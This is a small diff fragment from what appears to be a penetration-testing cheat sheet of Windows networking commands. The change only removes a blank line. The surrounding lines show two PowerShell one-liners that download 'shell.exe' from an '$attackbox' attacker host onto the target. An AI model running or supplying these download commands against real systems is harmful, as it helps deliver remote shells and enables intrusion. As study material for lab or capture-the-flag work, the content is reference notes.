@@ -74,7 +74,6 @@ curl http://
 Quick useful list of windows networking commands help
 
 ```powershell
-
 powershell -c "Invoke-WebRequest -Uri http://$attackbox:$port/shell.exe" -outfile shell.exe
 # or with powershell:
 (new-object system.net.webclient).downloadfile("http://$attackbox:$port/shell.exe", "destination")
